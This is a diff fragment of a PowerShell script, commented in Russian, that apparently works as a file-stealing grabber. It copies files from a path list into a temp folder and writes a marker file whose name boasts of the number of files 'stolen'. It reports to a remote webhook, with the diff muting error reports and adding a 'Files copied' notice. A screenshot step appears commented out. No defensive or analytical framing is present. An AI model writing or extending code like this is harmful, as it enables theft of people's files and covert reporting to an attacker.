@@ -240,17 +240,17 @@ foreach ($folderName in $filePaths.Keys) {
                     Copy-Item -Path $filePath -Destination $folderPath -Force
                 $totalFiles = $totalFiles + 1
             } catch {
-                Send-Webhook -Text "Ошибка копирования файла '$filePath': $_"
+                #Send-Webhook -Text "Ошибка копирования файла '$filePath': $_"
             }
         } else {
-            Send-Webhook -Text "Файл '$filePath' не найден по такому пути"
+            #Send-Webhook -Text "Файл '$filePath' не найден по такому пути"
         }
     }
 }
 $totalName = "Всего спизженно файлов — " + $totalFiles
 $totalPath = Join-Path -Path $tempFolder -ChildPath $totalName
 New-Item -ItemType File -Path $totalPath | Out-Null
-
+Send-Webhook -Text "Файлы скопированы"
 ### --- // Process \\ --- ###
 #$outputPath = "$tempFolder\Screenshot.jpg"
 
